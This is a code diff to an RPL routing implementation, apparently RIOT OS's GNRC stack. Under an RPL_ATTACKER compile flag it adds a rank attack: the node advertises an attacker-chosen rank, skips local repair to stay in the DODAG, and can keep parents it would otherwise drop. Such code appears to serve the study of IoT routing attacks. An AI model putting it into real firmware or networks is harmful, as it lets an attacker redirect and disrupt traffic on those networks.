@@ -253,7 +253,12 @@ void gnrc_rpl_local_repair(gnrc_rpl_dodag_t *dodag)
                          (uint8_t *) ipv6_addr_unspecified.u8,
                          sizeof(ipv6_addr_t));
     }
-
+#ifdef RPL_ATTACKER
+    if (atk_gnrc_rpl_opts.rank_atk_activated
+        && atk_gnrc_rpl_opts.keep_dodag) {
+        return;
+    }
+#endif
     if (dodag->my_rank != GNRC_RPL_INFINITE_RANK) {
         dodag->my_rank = GNRC_RPL_INFINITE_RANK;
         trickle_reset_timer(&dodag->trickle);
@@ -345,8 +350,16 @@ static gnrc_rpl_parent_t *_gnrc_rpl_find_preferred_parent(gnrc_rpl_dodag_t *doda
 #endif
 
     }
-
+#ifdef RPL_ATTACKER
+    if (atk_gnrc_rpl_opts.rank_atk_activated) {
+        dodag->my_rank = atk_gnrc_rpl_opts.rank_override;
+    }
+    else {
+        dodag->my_rank = dodag->instance->of->calc_rank(dodag->parents, 0);
+    }
+#else
     dodag->my_rank = dodag->instance->of->calc_rank(dodag->parents, 0);
+#endif
     if (dodag->my_rank != old_rank) {
         trickle_reset_timer(&dodag->trickle);
     }
@@ -354,7 +367,14 @@ static gnrc_rpl_parent_t *_gnrc_rpl_find_preferred_parent(gnrc_rpl_dodag_t *doda
     LL_FOREACH_SAFE(dodag->parents, elt, tmp) {
         if (DAGRANK(dodag->my_rank, dodag->instance->min_hop_rank_inc)
             <= DAGRANK(elt->rank, dodag->instance->min_hop_rank_inc)) {
+#ifdef RPL_ATTACKER
+            if (atk_gnrc_rpl_opts.rank_atk_activated 
+                && !atk_gnrc_rpl_opts.keep_parents) {
+                gnrc_rpl_parent_remove(elt);
+            }
+#else
             gnrc_rpl_parent_remove(elt);
+#endif
         }
     }
 
